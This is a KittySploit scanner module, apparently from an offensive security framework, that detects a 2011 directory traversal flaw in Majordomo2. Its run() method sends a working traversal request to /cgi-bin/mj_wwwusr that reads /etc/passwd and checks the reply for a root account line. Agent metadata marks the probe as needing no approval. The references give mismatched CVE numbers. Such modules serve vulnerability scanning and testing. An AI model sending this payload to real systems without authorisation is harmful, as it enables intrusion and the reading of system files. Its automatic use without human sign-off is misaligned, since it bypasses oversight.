#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the _list_file_get function in lib/Majordomo."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Majordomo2 - SMTP/HTTP Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in the _list_file_get function in lib/Majordomo.pm in Majordomo 2 before 20110131 allows remote attackers to read arbitrary files via .. (dot dot) sequences in the help command, as demonstrated using (1) a crafted email and (2) cgi-bin/mj_wwwusr in the web interface.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'majordomo2', 'lfi', 'edb', 'mj2', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/16103',
            'https://nvd.nist.gov/vuln/detail/CVE-2011-0063',
            'http://www.kb.cert.org/vuls/id/363726',
            'https://bug628064.bugzilla.mozilla.org/attachment.cgi?id=506481',
            'http://securityreason.com/securityalert/8061',
        ],
        'cve': 'CVE-2011-0049',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Majordomo2 - SMTP/HTTP Directory Traversal detected",
                path='/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd',
            )
            return True
        return False

